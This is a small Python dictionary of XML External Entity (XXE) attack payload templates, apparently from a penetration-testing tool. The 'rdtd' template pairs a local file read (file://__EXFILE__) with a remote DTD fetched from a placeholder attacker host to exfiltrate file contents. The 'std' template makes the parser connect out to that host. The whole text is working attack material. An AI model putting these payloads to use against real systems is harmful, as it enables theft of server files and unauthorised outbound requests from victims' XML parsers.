payloads = {
    "rdtd": {
        "description": "A Remote DTD causes the XML parser to make an external connection when successful.",
        "payload": '<!DOCTYPE root [ <!ENTITY % start "<![CDATA["><!ENTITY % stuff SYSTEM "file://__EXFILE__"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "__PROTOCOL__://__REMOTE_HOST__">%dtd;]>',
        "entity": "&xxe;",
    },
    "std":{ 
        "description": "A standard XXE payload",
        "payload":"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"__PROTOCOL__://__REMOTE_HOST__\"> ]>",
        "entity":"&xxe;",
    }
}
